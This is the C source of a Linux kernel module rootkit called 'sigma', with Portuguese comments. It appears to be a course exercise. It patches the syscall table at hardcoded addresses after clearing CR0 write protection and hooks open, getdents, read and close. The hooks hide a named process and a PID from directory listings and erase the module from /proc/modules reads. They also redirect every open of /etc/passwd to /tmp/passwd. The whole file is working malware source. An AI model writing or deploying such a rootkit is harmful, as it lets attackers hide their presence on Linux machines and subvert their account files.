
#include <linux/module.h>   
#include <linux/init.h>     
#include <linux/kernel.h>      
#include <asm/current.h>      
#include <linux/sched.h>
#include <linux/highmem.h>     
#include <asm/unistd.h>        
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>

#define BUFFLEN 256

// linux_dirent struct pra certificar que tenha a interpretacao correta:
struct linux_dirent {
  u64 d_ino;
  s64 d_off;
  unsigned short d_reclen;
  char d_name[BUFFLEN];
};

#define TARGET_PASSWD "/etc/passwd"
#define TEMP_PASSWD "/tmp/passwd"

static char * sigma_pid = "0000000000000000";
// set module parameters
module_param(sigma_pid, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(sigma_pid, "sigma_process pid");

static int file_desc_flag = -1;


#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))


void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff810707b0;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81070730;


//certamente essa porra ta no /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//pegando endereco do System.map
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;


asmlinkage int (*original_call)(const char *pathname, int flags);




asmlinkage int (*getdents_o)(unsigned int fd, struct linux_dirent* dirp,
			     unsigned int count);

asmlinkage int (*read_o)(int fd, void * buf, size_t count);

asmlinkage int (*close_o)(int fd);


asmlinkage int sigma_sys_getdents(unsigned int fd, struct linux_dirent* dirp,
			       unsigned int count){
  int numBytes = getdents_o(fd, dirp, count);

  struct linux_dirent * dirent;
  int position = 0; // position (in bytes)

  while ((position < numBytes) && (position >= 0)){
    unsigned short record_byte_size;
    int target_found = 0; // flag
    dirent = (struct linux_dirent *) ((char *)dirp + position); 
    record_byte_size = dirent->d_reclen;

    if (strcmp(dirent->d_name, "sigma_process") == 0){
      printk(KERN_INFO "encontrou processo pra esconder\n");
      target_found = 1;
    }
    else if(strcmp(dirent->d_name, sigma_pid) == 0){
      printk(KERN_INFO "encontrou pid pra esconder\n");
      target_found = 1;
    }

    if (target_found){
      memcpy(dirent, (char*)dirent + dirent->d_reclen,
	     numBytes - (size_t)(((char*)dirent + dirent->d_reclen)
				 - (char*)dirp));
      numBytes -= record_byte_size;
      break;
    }
    position += record_byte_size;
  }
  return numBytes;
}

asmlinkage ssize_t sigma_sys_read(int fd, void* buf, size_t count){
  ssize_t returnVal = read_o(fd, buf, count);

  
  if ((file_desc_flag == fd) && (file_desc_flag >= 0)){
    char * sigma_mod_ptr = NULL;
    char * newline_ptr = NULL;

    sigma_mod_ptr = strstr(buf,"sigma_mod");
    if (sigma_mod_ptr != NULL){
      newline_ptr = strchr(sigma_mod_ptr, '\n');
      if (newline_ptr != NULL){

	memcpy(sigma_mod_ptr, newline_ptr + 1,
	       returnVal - (ssize_t)((newline_ptr - (char*)buf)));
	returnVal -= (ssize_t)(newline_ptr - sigma_mod_ptr);
      }
    }
  }
  
  return returnVal;
}


asmlinkage int sigma_sys_open(const char *pathname, int flags){

  int returnVal;
  char buffer[sizeof(TARGET_PASSWD)];
  memset(buffer, 0, sizeof(buffer));

  
  if (strcmp(TARGET_PASSWD, pathname) == 0){
    printk(KERN_INFO "abriu call no /etc/passwd \n");

    
    if (!copy_to_user((void*)pathname, TEMP_PASSWD, sizeof(TEMP_PASSWD))){
      printk(KERN_INFO "substituicao bem sucedida\n");
    }
    else{
      printk(KERN_INFO "subtituicao insucedida\n");
    }
    // copiou certinho
    
    returnVal = original_call(pathname, flags);

    if (!copy_to_user((void*)pathname, TARGET_PASSWD, sizeof(TARGET_PASSWD))){
      printk(KERN_INFO "Sucedida re-sub\n");
    }
    else{
      printk(KERN_INFO "insucedida re-sub\n");
    }
    
    return returnVal;
  }
  else{
    
    returnVal = original_call(pathname, flags);
    if (strcmp(pathname, "/proc/modules") == 0){
      printk(KERN_INFO "Sigma aberto no /proc/modules\n");
      file_desc_flag = returnVal;
    }
    return returnVal;
  }
}


asmlinkage int sigma_sys_close(int fd){
  if (fd == file_desc_flag){
    printk(KERN_INFO "Sigma fechou\n");
    file_desc_flag = -1;
  }
  
  return close_o(fd);
}



static int initialize_sigma_module(void){
  struct page *page_ptr;

  
  printk(KERN_INFO "Sigma carregado..\n");

  
  write_cr0(read_cr0() & (~0x10000));

  page_ptr = virt_to_page(&sys_call_table);

  pages_rw(page_ptr, 1);


  original_call = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sigma_sys_open;

  getdents_o = (void*)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sigma_sys_getdents;

  read_o = (void*)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)sigma_sys_read;

  close_o = (void*)*(sys_call_table + __NR_close);
  *(sys_call_table + __NR_close) = (unsigned long)sigma_sys_close;
  
  
  pages_ro(page_ptr, 1);

  write_cr0(read_cr0() | 0x10000);

  printk(KERN_INFO "Sigma processo pid %s \n", sigma_pid);
  
  return 0;       
}  


static void exit_sigma_module(void) {
  struct page *page_ptr;

  printk(KERN_INFO "Sigma descarregado.\n"); 

  
  write_cr0(read_cr0() & (~0x10000));

  
  page_ptr = virt_to_page(&sys_call_table);

  pages_rw(page_ptr, 1);

  
  *(sys_call_table + __NR_open) = (unsigned long)original_call;
  *(sys_call_table + __NR_getdents) = (unsigned long)getdents_o;
  *(sys_call_table + __NR_close) = (unsigned long)close_o;
  *(sys_call_table + __NR_read) = (unsigned long)read_o;

  
  pages_ro(page_ptr, 1);

  write_cr0(read_cr0() | 0x10000);
}  


module_init(initialize_sigma_module);
module_exit(exit_sigma_module);          

